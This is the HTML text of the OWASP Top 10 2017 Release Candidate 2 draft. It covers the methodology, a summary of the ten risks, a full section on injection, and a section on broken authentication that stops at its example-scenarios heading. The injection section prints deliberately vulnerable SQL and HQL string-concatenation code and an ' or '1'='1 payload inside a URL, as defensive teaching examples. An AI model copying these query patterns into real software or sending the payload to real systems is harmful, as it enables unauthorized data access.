<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="generator" content="pandoc">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
  <title></title>
  <style type="text/css">code{white-space: pre;}</style>
  <!--[if lt IE 9]>
    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
  <![endif]-->
</head>
<body>
<p><img src="images/OWASP_logo.png" alt="OWASP LOGO" /></p>
<h2 id="owasp-top-10-2017-rc2">OWASP Top 10 2017 RC2</h2>
<p>The Ten Most Critical Web Application Security Risks</p>
<p>October 20, 2017</p>
<h3 id="release-candidate-2">Release Candidate 2</h3>
<p>Comments requested per instructions within</p>
<p><img src="images/front-wasp.png" alt="WASP Logo URL TBA" /></p>
<table style="width:8%;">
<colgroup>
<col style="width: 4%" />
<col style="width: 4%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;"></th>
<th style="text-align: left;"><img src="images/front-cc.png" alt="Creative Commons License Logo" /></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;"><a href="https://owasp.org" class="uri">https://owasp.org</a></td>
<td style="text-align: left;">This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License</td>
</tr>
</tbody>
</table>
<h1 id="important-notice">Important Notice</h1>
<h2 id="request-for-comments">Request for Comments</h2>
<p>This version is not a final draft.</p>
<p>The first release candidate received a great deal of push back, which caused a leadership change, involving the community in re-evaluating what the OWASP Top 10 is, the methodology, the data collection and analysis, and how we provide transparency and governance over the project. Most of all, the push back showed us how much passion the community has for the OWASP Top 10, and thus how critical it is for OWASP to get the Top 10 right for the majority of use cases.</p>
<p>We have worked extensively to validate the methodology, obtained a great deal of data on over 114,000 apps, and obtained qualitative data via survey by 550 community members on the two new categories – insecure deserialization and insufficient logging and monitoring.</p>
<p>We strongly urge for any corrections or issues to be logged at GitHub</p>
<ul>
<li><a href="https://github.com/OWASP/Top10/issues" class="uri">https://github.com/OWASP/Top10/issues</a></li>
</ul>
<p>Through public transparency, we provide traceability and ensure that all voices are heard during this final month before publication.</p>
<ul>
<li>Andrew van der Stock</li>
<li>Brian Glas</li>
<li>Neil Smithline</li>
<li>Torsten Gigler</li>
</ul>
<h1 id="toc">TOC</h1>
<p>&lt; replace me with a toc &gt;</p>
<h1 id="o-about-owasp">O About OWASP</h1>
<h2 id="about-owasp">About OWASP</h2>
<p>The Open Web Application Security Project (OWASP) is an open community dedicated to enabling organizations to develop, purchase, and maintain applications and APIs that can be trusted.</p>
<p>At OWASP you'll find free and open:</p>
<ul>
<li>Application security tools and standards</li>
<li>Complete books on application security testing, secure code development, and secure code review</li>
<li>Presentations and videos</li>
<li>Cheat sheets on many common topics</li>
<li>Standard security controls and libraries</li>
<li>Local chapters worldwide</li>
<li>Cutting edge research</li>
<li>Extensive conferences worldwide</li>
<li>Mailing lists</li>
</ul>
<p>Learn more at: <a href="https://www.owasp.org" class="uri">https://www.owasp.org</a>.</p>
<p>All of the OWASP tools, documents, videos, presentations, and chapters are free and open to anyone interested in improving application security.</p>
<p>We advocate approaching application security as a people, process, and technology problem, because the most effective approaches to application security require improvements in these areas.</p>
<p>OWASP is a new kind of organization. Our freedom from commercial pressures allows us to provide unbiased, practical, cost-effective information about application security. OWASP is not affiliated with any technology company, although we support the informed use of commercial security technology. OWASP produces many types of materials in a collaborative, transparent and open way.</p>
<p>The OWASP Foundation is the non-profit entity that ensures the project's long-term success. Almost everyone associated with OWASP is a volunteer, including the OWASP Board, Chapter Leaders, Project Leaders, and project members. We support innovative security research with grants and infrastructure.</p>
<p>Come join us!</p>
<h2 id="copyright-and-license">Copyright and License</h2>
<p><img src="images/license.png" alt="license" /></p>
<p>Copyright © 2003-2017 The OWASP Foundation. This document is released under the Creative Commons Attribution ShareAlike 3.0 license. For any reuse or distribution, you must make clear to others the license terms of this work.</p>
<h2 id="foreword">Foreword</h2>
<p>Insecure software is undermining our financial, healthcare, defense, energy, and other critical infrastructure. As our software becomes increasingly critical, complex, and connected, the difficulty of achieving application security increases exponentially. The rapid pace of modern software development processes makes risks even more critical to discover quickly and accurately. We can no longer afford to tolerate relatively simple security problems like those presented in this OWASP Top 10.</p>
<p>A great deal of feedback was received during the creation of the OWASP Top 10 2017, more than for any other equivalent OWASP effort. This shows how much passion the community has for the OWASP Top 10, and thus how critical it is for OWASP to get the Top 10 right for the majority of use cases.</p>
<p>Although the original goal of the OWASP Top 10 project was simply to raise awareness amongst developers, it has become the de facto application security standard. </p>
<p>We have taken steps in this release to firm up the definition of issues, and improve the recommendations to be leading practices that may be adopted as an application security standard that covers off around 80-90% of all common attacks and threats. We encourage large and high performing organizations to use the <a href="https://www.owasp.org/index.php/ASVS">OWASP Application Security Verification Standard</a> if a true standard is required, but for most, the OWASP Top 10 is a great start on the application security journey.</p>
<p>We have written up a range of suggested next steps for different users of the OWASP Top 10, including &quot;What's next for developers&quot;, &quot;What's next for testers&quot;, &quot;What's next for organizations&quot; which is suitable for CIO's and CISO's, &quot;What's next for application managers&quot;, which is suitable for application owners.</p>
<p>In the long term, we encourage all software development teams and organizations to create an application security program that is compatible with your culture and technology. These programs come in all shapes and sizes. Leverage your organization's existing strengths to do and measure what works for you.</p>
<p>We hope that the OWASP Top 10 is useful to your application security efforts. Please don't hesitate to contact OWASP with your questions, comments, and ideas at our GitHub project repository:</p>
<ul>
<li><a href="https://github.com/OWASP/Top10/issues" class="uri">https://github.com/OWASP/Top10/issues</a></li>
</ul>
<p>You can find OWASP Top 10 project and translations here:</p>
<ul>
<li><a href="https://www.owasp.org/index.php/top10" class="uri">https://www.owasp.org/index.php/top10</a></li>
</ul>
<p>Lastly, we wish to thank the founding leadership of the OWASP Top 10 project, Dave Wichers and Jeff Williams for all their efforts, and believing in us to get this finished with the community's help. Thank you!</p>
<ul>
<li>Torsten Gigler</li>
<li>Brian Glas</li>
<li>Neil Smithline</li>
<li>Andrew van der Stock</li>
</ul>
<h1 id="i-introduction">I Introduction</h1>
<h2 id="welcome-to-the-owasp-top-10-2017">Welcome to the OWASP Top 10 2017</h2>
<p>This major update adds several new issues, including two issues selected by the community - A8:2017-Insecure Deserialization and A10:2017-Insufficient logging and monitoring. Community feedback drove the collection of the most amount of data ever assembled in the preparation of an application security standard, and so we are confident that the remaining 8 issues are the most important for organizations to address, particularly the A3:2017-Exposure of Sensitive Data in the age of the EU's General Data Protection Regulation, A6:2017-Security Misconfiguration especially around cloud and API services, and A9:2017 Using Components with Known Vulnerabilities, which can be especially challenging for those on modern platforms, like node.js. </p>
<p>The OWASP Top 10 for 2017 is based primarily on 40+ data submissions from firms that specialize in application security and an industry survey that was completed by 515 individuals. This data spans vulnerabilities gathered from hundreds of organizations and over 100,000 real-world applications and APIs. The Top 10 items are selected and prioritized according to this prevalence data, in combination with consensus estimates of exploitability, detectability, and impact.</p>
<p>A primary aim of the OWASP Top 10 is to educate developers, designers, architects, managers, and organizations about the consequences of the most common and most important web application security weaknesses. The Top 10 provides basic techniques to protect against these high risk problem areas, and provides guidance on where to go from here.</p>
<h2 id="roadmap-for-future-activities">Roadmap for future activities</h2>
<p><strong>Don't stop at 10</strong>. There are hundreds of issues that could affect the overall security of a web application as discussed in the <a href="https://www.owasp.org/index.php/OWASP_Guide_Project">OWASP Developer's Guide</a> and the <a href="https://www.owasp.org/index.php/Category:Cheatsheets">OWASP Cheat Sheet Series</a>. These are essential reading for anyone developing web applications and APIs. Guidance on how to effectively find vulnerabilities in web applications and APIs is provided in the <a href="https://www.owasp.org/index.php/OWASP_Testing_Project">OWASP Testing Guide</a>.</p>
<p><strong>Constant change</strong>. The OWASP Top 10 will continue to change. Even without changing a single line of your application's code, you may become vulnerable as new flaws are discovered and attack methods are refined. Please review the advice at the end of the Top 10 in “What's Next For Developers, Testers, and Organizations” for more information.</p>
<p><strong>Think positive</strong>. When you're ready to stop chasing vulnerabilities and focus on establishing strong application security controls, OWASP is maintaining and promoting the <a href="https://www.owasp.org/index.php/ASVS">OWASP Application Security Verification Standard (ASVS)</a> as a guide to organizations and application reviewers on what to verify.</p>
<p><strong>Use tools wisely</strong>. Security vulnerabilities can be quite complex and deeply buried in code. In many cases, the most cost-effective approach for finding and eliminating these weaknesses is human experts armed with good tools.</p>
<p><strong>Push left, right, and everywhere</strong>. Focus on making security an integral part of your culture throughout your development organization. Find out more in the <a href="https://www.owasp.org/index.php/OWASP_SAMM_Project">OWASP Software Assurance Maturity Model (SAMM)</a>.</p>
<h2 id="attribution">Attribution</h2>
<p>We'd like to thank the organizations that contributed their vulnerability data to support the 2017 update. We received more than 40 responses to the call for data. For the first time, all the data contributed to a Top 10 release, and the full list of contributors, is publicly available. We believe this is one of the larger, more diverse collections of vulnerability data yet collected publicly.</p>
<p>As there are more contributors than space here, we have created a dedicated page to recognize the contributions made. We wish to give heartfelt thanks to these organizations for being willing to be on the front lines of publicly sharing vulnerability data from their efforts. We hope this will continue to grow and encourage more organizations to do the same and possibly be seen as one of the key milestones of evidence based security. The OWASP Top 10 would not be possible without these amazing contributions.</p>
<p>A big thank you to the 516 individuals who took the time to complete the industry ranked survey. Your voice helped determine two new additions to the Top 10. The additional comments, notes of encouragement (and criticisms), were all appreciated. We know your time is valuable and we wanted to say thanks.</p>
<p>We would like to thank in advance those individuals who contribute significant constructive comments and time reviewing this update to the Top 10. As much as possible, we have listed them on the attribution page '+Ack’.</p>
<p>And finally, we'd like to thank in advance all the translators out there that will translate this release of the Top 10 into numerous different languages, helping to make the OWASP Top 10 more accessible to the entire planet.</p>
<h1 id="rn-release-notes">RN Release Notes</h1>
<h2 id="what-changed-from-2013-to-2017">What changed from 2013 to 2017?</h2>
<p>Change has accelerated over the last four years, and the OWASP Top 10 needed to change. We've completely refactored the OWASP Top 10, revamped the methodology, utilized a new data call process, worked with the community, re-ordered our risks, re-written each risk from the ground up, and added references to frameworks and languages that are now commonly used. </p>
<p>Over the last decade, and in particularly these last few years, the fundamental architecture of applications has changed significantly:</p>
<ul>
<li>JavaScript is now the primary language of the web. node.js and modern web frameworks such as Bootstrap, Electron, Angular, React amongst many others, means source that was once on the server is now running on untrusted browsers. </li>
<li>Single page applications, written in JavaScript frameworks such as Angular and React, allow the creation of highly modular front end user experiences, not to mention the rise and rise of mobile apps using the same APIs as single page apps</li>
<li>Microservices written in node.js and Spring Boot are replacing older enterprise service bus applications using EJBs and so on. Old code that never expected to be communicated with directly from the Internet is now sitting behind an API or RESTful web service. The assumptions that underlie this code, such as trusted callers, are simply not valid. </li>
</ul>
<p><strong>New issues, supported by data</strong></p>
<ul>
<li>A4:2017 XML External Entity (XXE) is a new category primarily supported by SAST data sets. </li>
</ul>
<p><strong>New issues, supported by the community</strong></p>
<p>We asked the community to provide insight into two forward looking weakness categories. After 516 peer submissions, and  removing issues that were already supported by data (such as Sensitive Data Exposure and XXE), the two new issues are </p>
<ul>
<li>A8:2017-Insecure Deserialization, responsible for one of the worst breaches of all time, and</li>
<li>A10:2017-Insufficient Logging and Monitoring, the lack of which can prevent or significantly delay malicious activity and breach detection, incident response and digital forensics.</li>
</ul>
<p><strong>Retired, but not forgotten</strong></p>
<ul>
<li><strong>A4 Insecure direct object references</strong> and <strong>A7 Missing function level access control</strong> merged into A5:2017-Broken Access Control.</li>
<li><strong>A8 CSRF</strong>. Less than 5% of the data set supports CSRF today, which places it around #13 </li>
<li><strong>A10 Unvalidated redirects and forwards</strong>. Less than 1% of the data set supports this issue today, as it’s now #25</li>
</ul>
<table style="width:12%;">
<colgroup>
<col style="width: 4%" />
<col style="width: 4%" />
<col style="width: 4%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;">OWASP Top 10 2013</th>
<th style="text-align: left;">+/-</th>
<th style="text-align: left;">OWASP Top 10 2017</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">A1 - Injection</td>
<td style="text-align: left;">-&gt;</td>
<td style="text-align: left;">A1:2017 – Injection</td>
</tr>
<tr class="even">
<td style="text-align: left;">A2 - Broken authentication and Session Management</td>
<td style="text-align: left;">-&gt;</td>
<td style="text-align: left;">A2:2017 – Broken Authentication</td>
</tr>
<tr class="odd">
<td style="text-align: left;">A3 – Cross-Site Scripting (XSS)</td>
<td style="text-align: left;">v</td>
<td style="text-align: left;">A3:2013 – Sensitive Data Exposure</td>
</tr>
<tr class="even">
<td style="text-align: left;">A4 – Insecure Direct Object References [Merged+A7]</td>
<td style="text-align: left;">M</td>
<td style="text-align: left;">A4:2017 – XML External Entity (XXE) [NEW]</td>
</tr>
<tr class="odd">
<td style="text-align: left;">A5 – Security Misconfiguration</td>
<td style="text-align: left;">v</td>
<td style="text-align: left;">A5:2017 – Broken Access Control [Merged]</td>
</tr>
<tr class="even">
<td style="text-align: left;">A6 – Sensitive Data Exposure</td>
<td style="text-align: left;">^</td>
<td style="text-align: left;">A6:2017 – Security Misconfiguration</td>
</tr>
<tr class="odd">
<td style="text-align: left;">A7 – Missing Function Level Access Control [Merged+A4]</td>
<td style="text-align: left;">M</td>
<td style="text-align: left;">A7:2017 – Cross-Site Scripting (XSS)</td>
</tr>
<tr class="even">
<td style="text-align: left;">A8 – Cross-Site Request Forgery (CSRF)</td>
<td style="text-align: left;">X</td>
<td style="text-align: left;">A8:2017 – Insecure Deserialization [NEW, Community]</td>
</tr>
<tr class="odd">
<td style="text-align: left;">A9 – Using Components with Known Vulnerabilities</td>
<td style="text-align: left;">-&gt;</td>
<td style="text-align: left;">A9:2017 – Using Components with Known Vulnerabilities</td>
</tr>
<tr class="even">
<td style="text-align: left;">A10 – Unvalidated Redirects and Forwards</td>
<td style="text-align: left;">X</td>
<td style="text-align: left;">A10:2017 – Insufficient Logging &amp; Monitoring [NEW, Comm.]</td>
</tr>
</tbody>
</table>
<h1 id="risk---application-security-risks">Risk - Application Security Risks</h1>
<h2 id="what-are-application-security-risks">What Are Application Security Risks?</h2>
<p>Attackers can potentially use many different paths through your application to do harm to your business or organization. Each of these paths represents a risk that may, or may not, be serious enough to warrant attention.</p>
<p><img src="images/0x10-risk-1.png" alt="App Security Risks" /></p>
<p>Sometimes, these paths are trivial to find and exploit and sometimes they are extremely difficult. Similarly, the harm that is caused may be of no consequence, or it may put you out of business. To determine the risk to your organization, you can evaluate the likelihood associated with each threat agent, attack vector, and security weakness and combine it with an estimate of the technical and business impact to your organization. Together, these factors determine your overall risk.</p>
<h2 id="whats-my-risk">What's My Risk</h2>
<p>The <a href="https://www.owasp.org/index.php/Top10">OWASP Top 10</a> focuses on identifying the most serious risks for a broad array of organizations. For each of these risks, we provide generic information about likelihood and technical impact using the following simple ratings scheme, which is based on the OWASP Risk Rating Methodology.  </p>
<table style="width:25%;">
<colgroup>
<col style="width: 4%" />
<col style="width: 4%" />
<col style="width: 4%" />
<col style="width: 4%" />
<col style="width: 4%" />
<col style="width: 4%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;">Threat Agents</th>
<th style="text-align: left;">Exploitability</th>
<th style="text-align: left;">Weakness Prevalence</th>
<th style="text-align: left;">Weakness Detectability</th>
<th style="text-align: left;">Technical Impacts</th>
<th style="text-align: left;">Business Impacts</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">App Specific</td>
<td style="text-align: left;">Easy</td>
<td style="text-align: left;">Widespread</td>
<td style="text-align: left;">Easy</td>
<td style="text-align: left;">Severe</td>
<td style="text-align: left;">App / Business Specific</td>
</tr>
<tr class="even">
<td style="text-align: left;">App Specific</td>
<td style="text-align: left;">Average</td>
<td style="text-align: left;">Common</td>
<td style="text-align: left;">Average</td>
<td style="text-align: left;">Moderate</td>
<td style="text-align: left;">App / Business Specific</td>
</tr>
<tr class="odd">
<td style="text-align: left;">App Specific</td>
<td style="text-align: left;">Difficult</td>
<td style="text-align: left;">Uncommon</td>
<td style="text-align: left;">Difficult</td>
<td style="text-align: left;">Minor</td>
<td style="text-align: left;">App / Business Specific</td>
</tr>
</tbody>
</table>
<p>In this edition, we have changed the risk rating system around compared to previous version to assist with our ranking of likelihoods and impacts. This is not an issue within the document, but is clear in the public data analysis.</p>
<p>Each organization is unique, and so are the threat actors for that organization, their goals, and the impact of any breach. If a public interest organization uses a CMS for public information and a health system uses that same exact CMS for sensitive health records, the threat actors and business impacts are very different for the same exact software. It is critical that you apply your custom threat agents and business impacts based upon the data asset criticality.</p>
<p>Where possible, the names of the risks in the Top 10 are aligned with CWE weaknesses to promote generally accepted security practices and to reduce confusion. </p>
<h2 id="references">References</h2>
<h3 id="owasp">OWASP</h3>
<ul>
<li><a href="https://www.owasp.org/index.php/OWASP_Risk_Rating_Methodology">OWASP Risk Rating Methodology</a></li>
<li><a href="https://www.owasp.org/index.php/Threat_Risk_Modeling">Article on Threat/Risk Modeling</a></li>
</ul>
<h3 id="external">External</h3>
<ul>
<li><a href="https://www.iso.org/iso-31000-risk-management.html">ISO 31000: Risk Management Std</a></li>
<li><a href="https://www.iso.org/isoiec-27001-information-security.html">ISO 27001: ISMS</a></li>
<li><a href="https://www.nist.gov/cyberframework">NIST Cyber Framework (US)</a></li>
<li><a href="https://www.asd.gov.au/infosec/mitigationstrategies.htm">ASD Strategic Mitigations (AU)</a></li>
<li><a href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator">NIST CVSS 3.0</a></li>
<li><a href="https://www.microsoft.com/en-us/download/details.aspx?id=49168">Microsoft Threat Modelling Tool</a></li>
</ul>
<h1 id="t10-owasp-top-10-application-security-risks-2017">T10 OWASP Top 10 Application Security Risks – 2017</h1>
<table style="width:8%;">
<colgroup>
<col style="width: 4%" />
<col style="width: 4%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;">Risk</th>
<th style="text-align: left;">Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">A1:2017 Injection</td>
<td style="text-align: left;">Injection flaws, such as SQL, OS, and LDAP injection occur when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.</td>
</tr>
<tr class="even">
<td style="text-align: left;">A2:2017 Broken Authentication</td>
<td style="text-align: left;">Application functions related to authentication and session management are often implemented incorrectly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users’ identities (temporarily or permanently).</td>
</tr>
<tr class="odd">
<td style="text-align: left;">A3:2017 Sensitive Data Exposure</td>
<td style="text-align: left;">Many web applications and APIs do not properly protect sensitive data, such as financial, healthcare, and PII. Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes. Sensitive data deserves extra protection such as encryption at rest or in transit, as well as special precautions when exchanged with the browser.</td>
</tr>
<tr class="even">
<td style="text-align: left;">A4:2017 XML External Entity (XXE)</td>
<td style="text-align: left;">Many older or poorly configured XML processors evaluate external entity references within XML documents. External entities can be used to disclose internal files using the file URI handler, internal SMB file shares on unpatched Windows servers, internal port scanning, remote code execution, and denial of service attacks, such as the Billion Laughs attack.</td>
</tr>
<tr class="odd">
<td style="text-align: left;">A5:2017 Broken Access Control</td>
<td style="text-align: left;">Restrictions on what authenticated users are allowed to do are not properly enforced. Attackers can exploit these flaws to access unauthorized functionality and/or data, such as access other users' accounts, view sensitive files, modify other users’ data, change access rights, etc.</td>
</tr>
<tr class="even">
<td style="text-align: left;">A6:2017 Security Misconfiguration</td>
<td style="text-align: left;">Security misconfiguration is the most common issue in the data, which is due in part to manual or ad hoc configuration (or not configuring at all), insecure default configurations, open S3 buckets, misconfigured HTTP headers, error messages containing sensitive information, not patching or upgrading systems, frameworks, dependencies, and components in a timely fashion (or at all).</td>
</tr>
<tr class="odd">
<td style="text-align: left;">A7:2017 Cross-Site Scripting (XSS)</td>
<td style="text-align: left;">XSS flaws occur whenever an application includes untrusted data in a new web page without proper validation or escaping, or updates an existing web page with user supplied data using a browser API that can create JavaScript. XSS allows attackers to execute scripts in the victim's browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites.</td>
</tr>
<tr class="even">
<td style="text-align: left;">A8:2017 Insecure Deserialization</td>
<td style="text-align: left;">Insecure deserialization flaws occur when an application receives hostile serialized objects. Insecure deserialization leads to remote code execution. Even if deserialization flaws do not result in remote code execution, serialized objects can be replayed, tampered or deleted to spoof users, conduct injection attacks, and elevate privileges.</td>
</tr>
<tr class="odd">
<td style="text-align: left;">A9:2017 Using Components with Known Vulnerabilities</td>
<td style="text-align: left;">Components, such as libraries, frameworks, and other software modules, run with the same privileges as the application. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications and APIs using components with known vulnerabilities may undermine application defenses and enable various attacks and impacts.</td>
</tr>
<tr class="even">
<td style="text-align: left;">A10:2017 Insufficient Logging &amp; Monitoring</td>
<td style="text-align: left;">Insufficient logging and monitoring, coupled with missing or ineffective integration with incident response allows attackers to further attack systems, maintain persistence, pivot to more systems, and tamper, extract or destroy data. Most breach studies show time to detect a breach is over 200 days, typically detected by external parties rather than internal processes or monitoring.</td>
</tr>
</tbody>
</table>
<h1 id="a12017-injection">A1:2017 Injection</h1>
<table style="width:12%;">
<colgroup>
<col style="width: 4%" />
<col style="width: 4%" />
<col style="width: 4%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;">Threat agents/Attack vectors</th>
<th style="text-align: left;">Security Weakness</th>
<th style="text-align: left;">Impacts</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">Access Lvl \</td>
<td style="text-align: left;">Exploitability 3</td>
<td style="text-align: left;">Prevalence 2 \</td>
</tr>
<tr class="even">
<td style="text-align: left;">Almost any source of data can be an injection vector, including users, parameters, external and internal web services, and all types of users. <a href="http://www.owasp.org/index.php/Injection_Flaws">Injection flaws</a> occur when an attacker can send hostile data to an interpreter. </td>
<td style="text-align: left;">Injection flaws are very prevalent, particularly in legacy code. They are often found in SQL, LDAP, XPath, or NoSQL queries; OS commands; XML parsers, SMTP Headers, expression languages, ORM queries. Injection flaws are easy to discover when examining code. Scanners and fuzzers can help attackers find injection flaws.</td>
<td style="text-align: left;">Injection can result in data loss or corruption, lack of accountability, or denial of access. Injection can sometimes lead to complete host takeover. The business impact depends on the protection needs of your application and data.</td>
</tr>
</tbody>
</table>
<h2 id="am-i-vulnerable-to-injection">Am I vulnerable to Injection?</h2>
<p>An application is vulnerable to attack when:</p>
<ul>
<li>User suppled data is not validated, filtered or sanitized by the application.</li>
<li>Hostile data is used directly with dynamic queries or non-parameterized calls for the interpreter without context-aware escaping.</li>
<li>Hostile data is used within ORM search parameters such that the search evaluates out to include sensitive or all records.</li>
<li>Hostile data is directly used or concatenated, such that the SQL or command contains both structure and hostile data in dynamic queries, commands, or in stored procedures.</li>
</ul>
<p>Some of the more common injections are SQL, OS command, ORM, LDAP, and Expression Language (EL) or OGNL injection.. The concept is identical between all interpreters. Organizations can include SAST and DAST tooling into the CI/CD pipeline to alert if existing or newly checked in code has injection prior to production deployment. Manual and automated source code review is the best method of detecting if you are vulnerable to injections, closely followed by thorough DAST scans of all parameters, fields, headers, cookies, JSON, and XML data inputs.</p>
<h2 id="how-do-i-prevent-injection">How Do I Prevent Injection?</h2>
<p>Preventing injection requires keeping data separate from commands and queries.</p>
<ul>
<li>The preferred option is to use a safe API which avoids the use of the interpreter entirely or provides a parameterized interface, or migrate to use ORMs or Entity Framework. <strong>NB</strong>: When parameterized, stored procedures can still introduce SQL injection if PL/SQL or T-SQL concatenates queries and data, or executes hostile data with EXECUTE IMMEDIATE or exec().</li>
<li>Positive or &quot;white list&quot; input validation, but this is not a complete defense as many applications require special characters, such as text areas or APIs for mobile applications</li>
<li>For any residual dynamic queries, escape special characters using the specific escape syntax for that interpreter. OWASP's Java Encoder and similar libraries provide such escaping routines. NB: SQL structure such as table names, column names, and so on cannot be escaped, and thus user-supplied structure names are dangerous. This is a common issue in report writing software.</li>
<li>Use LIMIT and other SQL controls within queries to prevent mass disclosure of records in case of SQL injection.</li>
</ul>
<h2 id="example-attack-scenarios">Example Attack Scenarios</h2>
<p><strong>Scenario #1</strong>: An application uses untrusted data in the construction of the following vulnerable SQL call:</p>
<pre><code>String query = &quot;SELECT * FROM accounts WHERE custID=&#39;&quot; + request.getParameter(&quot;id&quot;) + &quot;&#39;&quot;;</code></pre>
<p><strong>Scenario #2</strong>: Similarly, an application’s blind trust in frameworks may result in queries that are still vulnerable, (e.g. Hibernate Query Language (HQL)):</p>
<pre><code>Query HQLQuery = session.createQuery(&quot;FROM accounts WHERE custID=&#39;&quot; + request.getParameter(&quot;id&quot;) + &quot;&#39;&quot;);</code></pre>
<p>In both cases, the attacker modifies the 'id’ parameter value in her browser to send: ' or '1'='1. For example:</p>
<ul>
<li><code>http://example.com/app/accountView?id=' or '1'='1</code></li>
</ul>
<p>This changes the meaning of both queries to return all the records from the accounts table. More dangerous attacks could modify data or even invoke stored procedures.</p>
<h2 id="references-1">References</h2>
<h3 id="owasp-1">OWASP</h3>
<ul>
<li><a href="https://www.owasp.org/index.php/OWASP_Proactive_Controls#2:_Parameterize_Queries">OWASP Proactive Controls: Parameterize Queries</a></li>
<li><a href="TBA">OWASP ASVS: V5 Input Validation and Encoding</a></li>
<li><a href="https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005)">OWASP Testing Guide: SQL Injection</a>, <a href="https://www.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013)">Command Injection</a>, <a href="https://www.owasp.org/index.php/Testing_for_ORM_Injection_(OTG-INPVAL-007)">ORM injection</a></li>
<li><a href="https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet">OWASP Cheat Sheet: SQL Injection Prevention</a></li>
<li><a href="https://www.owasp.org/index.php/Injection_Prevention_Cheat_Sheet_in_Java">OWASP Cheat Sheet: Injection Prevention in Java</a></li>
<li><a href="https://www.owasp.org/index.php/Query_Parameterization_Cheat_Sheet">OWASP Cheat Sheet: Query Parameterization</a></li>
<li><a href="https://www.owasp.org/index.php/Command_Injection_Defense_Cheat_Sheet">OWASP Cheat Sheet: Command Injection Defense</a></li>
</ul>
<h3 id="external-1">External</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/77.html">CWE-77 Command Injection</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89 SQL Injection</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/564.html">CWE-564 Hibernate Injection</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/917.html">CWE-917 Expression Language Injection</a></li>
<li><a href="https://portswigger.net/knowledgebase/issues/details/00101080_serversidetemplateinjection">PortSwigger: Server-side template injection</a></li>
</ul>
<h1 id="a22017-broken-authentication">A2:2017 Broken Authentication</h1>
<table style="width:12%;">
<colgroup>
<col style="width: 4%" />
<col style="width: 4%" />
<col style="width: 4%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;">Threat agents/Attack vectors</th>
<th style="text-align: left;">Security Weakness</th>
<th style="text-align: left;">Impacts</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">Access Lvl \</td>
<td style="text-align: left;">Exploitability 3</td>
<td style="text-align: left;">Prevalence 2 \</td>
</tr>
<tr class="even">
<td style="text-align: left;">Attackers have access to hundreds of millions of valid username and password combinations for credential stuffing, default administrative account lists, automated brute force and dictionary attack tools, and advanced GPU cracking tools.</td>
<td style="text-align: left;">The prevalence of broken authentication is widespread due to the design and implementation of most identity and access management systems. Attackers can detect broken authentication using manual means, but are often attracted by password dumps, or after a social engineering attack such as phishing or similar. </td>
<td style="text-align: left;">Attackers only have to gain access to a few accounts, or just one admin  account to compromise the system. Depending on the domain of the app, this may allow money laundering social security fraud and identity theft; or disclose legally protected highly sensitive information.</td>
</tr>
</tbody>
</table>
<h2 id="am-i-vulnerable-to-broken-auth">Am I Vulnerable to Broken Auth?</h2>
<p>Confirmation of the user's identity, authentication, and session management are critical for separating malicious unauthenticated attackers from authorized users.<br />
You may have authentication weaknesses if your application:</p>
<ul>
<li>Permits <a href="https://www.owasp.org/index.php/Credential_stuffing">credential stuffing</a>, which is where the attacker has a list of valid usernames and passwords.</li>
<li>Permits brute force or other automated attacks.</li>
<li>Permits default, weak or well-known passwords, such as &quot;Password1&quot; or &quot;admin/admin“.</li>
<li>Uses weak or ineffectual credential recovery and forgot password processes, such as &quot;knowledge-based answers&quot;, which cannot be made safe.</li>
<li>Uses plain text, encrypted, or weakly hashed passwords permit the rapid recovery of passwords using GPU crackers or brute force tools.</li>
<li>Has missing or ineffective multi-factor authentication.</li>
</ul>
<h2 id="how-do-i-prevent-this">How Do I Prevent This?</h2>
<ul>
<li>Do not ship or deploy with any default credentials, particularly for admin users</li>
<li><a href="https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet#Leverage_an_adaptive_one-way_function">Store passwords using a modern one way hash function</a>, such as Argon2 or PBKDF2, with sufficient work factor to prevent realistic GPU cracking attacks.</li>
<li>Implement weak password checks, such as testing new or changed passwords against a list of the <a href="https://github.com/danielmiessler/SecLists/tree/master/Passwords">top 10000 worst passwords</a>.</li>
<li>Align password length, complexity and rotation policies with <a href="https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret">NIST 800-63 B's guidelines in section 5.1.1 for Memorized Secrets</a> or other modern, evidence based password policies</li>
<li>Ensure registration, credential recovery, and API pathways are hardened against account enumeration attacks by using the same messages for all outcomes</li>
<li>Where possible, implement multi-factor authentication to prevent credential stuffing, brute force, automated, and stolen credential attacks</li>
<li>Log authentication failures and alert administrators when credential stuffing, brute force, other attacks are detected.</li>
</ul>
<h2 id="example-attack-scenarios-1">Example Attack Scenarios</h2>
